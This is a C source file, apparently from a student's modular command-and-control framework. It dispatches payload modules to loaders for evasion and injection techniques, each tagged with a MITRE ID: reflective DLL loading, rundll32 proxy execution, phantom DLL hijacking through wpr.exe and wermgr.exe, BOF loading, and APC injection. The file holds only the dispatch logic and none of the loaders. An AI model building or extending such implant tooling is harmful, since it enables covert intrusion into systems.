/*
 * ============================================================
 *  execution_engine.c - Dispatcher multi-technique
 *
 *  Techniques :
 *    TECHNIQUE_RDLL     (T1620)     > rdll_loader_execute()
 *    TECHNIQUE_RUNDLL32 (T1218.011) > rundll32_loader_execute()
 *    TECHNIQUE_WPR      (T1574.002) > wpr_loader_execute()
 *    TECHNIQUE_WERMGR   (T1574.002) > wermgr_loader_execute()
 *
 *  Auteur  : El Mazdougui Anass
 *  Projet  : Framework C2 Modulaire - PFE INPT 2026
 * ============================================================
 */
#include "execution_engine.h"
#include "rdll_loader.h"
#include "rundll32_loader.h"
#include "wpr_loader.h"
#include "wermgr_loader.h"
#include "coff_loader.h"
#include "apc_loader.h"
#include "apcinject_loader.h"
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

/* ============================================================
 *  INITIALISATION / NETTOYAGE
 * ============================================================ */

int init_execution_engine(void) {
    /* Aucune ressource globale a initialiser pour l'instant.
     * Reserve pour les techniques futures (pre-allocation, etc.) */
    return 0;
}

void cleanup_execution_engine(void) {
    /* Liberation des ressources globales si necessaire */
}

/* ============================================================
 *  HELPERS : CONVERSION TECHNIQUE ? CHA?NE
 * ============================================================ */

technique_t technique_from_string(const char *name) {
    if (!name) return TECHNIQUE_DEFAULT;
    if (strcmp(name, "rdll")     == 0) return TECHNIQUE_RDLL;
    if (strcmp(name, "rundll32") == 0) return TECHNIQUE_RUNDLL32;
    if (strcmp(name, "wpr")      == 0) return TECHNIQUE_WPR;
    if (strcmp(name, "wermgr")   == 0) return TECHNIQUE_WERMGR;
    if (strcmp(name, "bof")      == 0) return TECHNIQUE_BOF;
    if (strcmp(name, "apc")      == 0) return TECHNIQUE_APC;
    if (strcmp(name, "apcinject") == 0) return TECHNIQUE_APCINJECT;
    return TECHNIQUE_DEFAULT;
}

const char *technique_to_string(technique_t t) {
    switch (t) {
        case TECHNIQUE_RDLL:     return "rdll";
        case TECHNIQUE_RUNDLL32: return "rundll32";
        case TECHNIQUE_WPR:      return "wpr";
        case TECHNIQUE_WERMGR:   return "wermgr";
        case TECHNIQUE_BOF:      return "bof";
        case TECHNIQUE_APC:      return "apc";
        case TECHNIQUE_APCINJECT: return "apcinject";
        default:                 return "rdll";
    }
}

/* ============================================================
 *  LIBERATION D'UN RESULTAT
 * ============================================================ */

void free_module_result(module_result_t *result) {
    if (!result) return;
    if (result->data)      { free(result->data);      result->data      = NULL; }
    if (result->error_msg) { free(result->error_msg); result->error_msg = NULL; }
    result->data_len = 0;
    result->status   = 0;
}

/* ============================================================
 *  DISPATCHER PRINCIPAL
 * ============================================================ */

module_result_t execute_module(
    technique_t          technique,
    const unsigned char *module_bytes,
    size_t               module_size,
    const unsigned char *args,
    size_t               args_len)
{
    if (!module_bytes || module_size == 0) {
        module_result_t r = { -1, NULL, 0, NULL };
        const char *msg = "execute_module: bytes du module invalides";
        r.error_msg = (char *)malloc(strlen(msg) + 1);
        if (r.error_msg) strcpy(r.error_msg, msg);
        return r;
    }

    switch (technique) {

    /* ?? T1620 : Reflective DLL Loading ?????????????????????? */
    case TECHNIQUE_RDLL:
        return rdll_loader_execute(module_bytes, module_size, args, args_len);

    /* ?? T1218.011 : Signed Binary Proxy - rundll32.exe ?????? */
    case TECHNIQUE_RUNDLL32:
        return rundll32_loader_execute(module_bytes, module_size, args, args_len);

    /* ?? T1574.002 : Phantom DLL - wpr.exe ??????????????????? */
    case TECHNIQUE_WPR:
        return wpr_loader_execute(module_bytes, module_size, args, args_len);

    /* ?? T1574.002 : Phantom DLL - wermgr.exe ???????????????? */
    case TECHNIQUE_WERMGR:
        return wermgr_loader_execute(module_bytes, module_size, args, args_len);

    /* ?? T1620 : COFF/BOF Loader ????????????????????????????? */
    case TECHNIQUE_BOF:
        return coff_loader_execute(module_bytes, module_size, args, args_len);

    /* ?? T1055 : APC Injection ???????????????????????????????? */
    case TECHNIQUE_APC:
        return apc_loader_execute(module_bytes, module_size, args, args_len);

    /* ?? T1055.004 : APC Injection cross-process ?????????????? */
    case TECHNIQUE_APCINJECT:
        return apcinject_loader_execute(module_bytes, module_size, args, args_len);

    default:
        return rdll_loader_execute(module_bytes, module_size, args, args_len);
    }
}
